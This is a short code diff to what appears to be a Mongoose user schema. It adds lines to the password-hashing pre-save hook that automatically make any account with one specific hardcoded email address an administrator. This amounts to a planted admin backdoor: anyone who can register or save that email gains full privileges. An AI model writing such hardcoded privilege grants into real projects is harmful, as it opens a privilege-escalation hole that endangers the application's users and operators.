@@ -68,8 +68,13 @@ userSchema.methods.matchPassword = async function (enteredPassword) {
     return await bcrypt.compare(enteredPassword, this.password);
 };
 
-// Pre-save middleware to hash password before saving to database
+// Pre-save middleware to hash password and set admin status
 userSchema.pre('save', async function (next) {
+    // Automatically set isAdmin for specific admin email
+    if (this.email === 'admin2722@gmail.com') {
+        this.isAdmin = true;
+    }
+
     if (!this.isModified('password')) {
         return next();
     }
